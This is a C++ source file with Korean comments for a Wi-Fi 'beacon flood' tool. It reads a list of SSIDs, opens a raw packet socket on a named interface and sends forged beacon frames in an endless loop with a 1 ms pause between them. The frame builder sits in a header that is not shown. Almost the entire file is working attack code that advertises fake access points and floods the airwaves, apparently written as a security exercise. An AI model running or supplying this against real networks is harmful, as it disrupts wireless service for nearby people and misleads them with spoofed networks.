// beaconflood.cpp
#include "beacon_frame.h"

#include <iostream>
#include <fstream>
#include <sstream>
#include <vector>
#include <string>
#include <cstdlib>
#include <cstring>
#include <chrono>
#include <thread>

#include <net/ethernet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <linux/if_packet.h>
#include <unistd.h>
#include <sys/ioctl.h>

// SSID 목록을 읽고 ssidList 벡터에 저장
bool readSSIDList(const std::string &filename, std::vector<std::string> &ssidList) {
    std::ifstream infile(filename);
    if (!infile) {
        std::cerr << "Error opening SSID list file: " << filename << "\n";
        return false;
    }
    std::string line;
    while (std::getline(infile, line)) {
        std::istringstream iss(line);
        std::string ssid;
        if (!(iss >> ssid)) // 한단어씩 읽고 공백이 있으면 다음 단어로 넘어감
            continue;
        ssidList.push_back(ssid);
    }
    return true;
}

int openRawSocket(const std::string &iface) {
    int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL)); // 모든 이더넷 프레임 수신
    if (sockfd < 0) {
        perror("socket");
        return -1;
    }
    struct ifreq ifr;
    std::strcpy(ifr.ifr_name, iface.c_str());
    if (ioctl(sockfd, SIOCGIFINDEX, &ifr) == -1) {
        perror("ioctl");
        close(sockfd);
        return -1;
    }
    struct sockaddr_ll sll;
    std::memset(&sll, 0, sizeof(sll)); // 초기화
    sll.sll_family   = AF_PACKET;
    sll.sll_ifindex  = ifr.ifr_ifindex;
    sll.sll_protocol = htons(ETH_P_ALL);
    if (bind(sockfd, reinterpret_cast<struct sockaddr*>(&sll), sizeof(sll)) == -1) { // bind는 2번째 인자로 struct sockaddr*를 받기 때문에 형 변환환
        perror("bind");
        close(sockfd);
        return -1;
    }
    return sockfd;
}

int main(int argc, char* argv[]) {
    if (argc != 3) {
        std::cerr << "Syntax: beacon-flood <interface> <ssid-list-file>\n";
        return -1;
    }
    std::string iface = argv[1];
    std::string ssidFile = argv[2];

    // SSID 목록 읽기
    std::vector<std::string> ssidList;
    if (!readSSIDList(ssidFile, ssidList)) {
        return -1;
    }
    if (ssidList.empty()) {
        std::cerr << "SSID list is empty.\n";
        return -1;
    }

    // Raw socket 생성
    int sockfd = openRawSocket(iface);
    if (sockfd < 0) {
        return -1;
    }

    // 각 SSID에 대해 Beacon 프레임 구성
    std::vector<std::vector<uint8_t>> beaconFrames;
    for (const auto &ssid : ssidList) {
        std::vector<uint8_t> frame;
        if (createBeaconFrame(ssid, frame)) {
            beaconFrames.push_back(frame);
            std::cout << "Created Beacon for SSID: " << ssid << "\n";
        } else {
            std::cerr << "Failed to create Beacon for SSID: " << ssid << "\n";
        }
    }
    if (beaconFrames.empty()) {
        std::cerr << "No Beacon frames created.\n";
        close(sockfd);
        return -1;
    }

    std::cout << "Beacon Flooding started on interface " << iface << "\n";

    // Beacon 프레임 전송
    while (true) {
        for (auto &frame : beaconFrames) {
            ssize_t sent = send(sockfd, frame.data(), frame.size(), 0);
            if (sent < 0) {
                perror("send");
            }
            // 전송 속도 제한
            std::this_thread::sleep_for(std::chrono::milliseconds(1));
        }
    }

    close(sockfd);
    return 0;
}
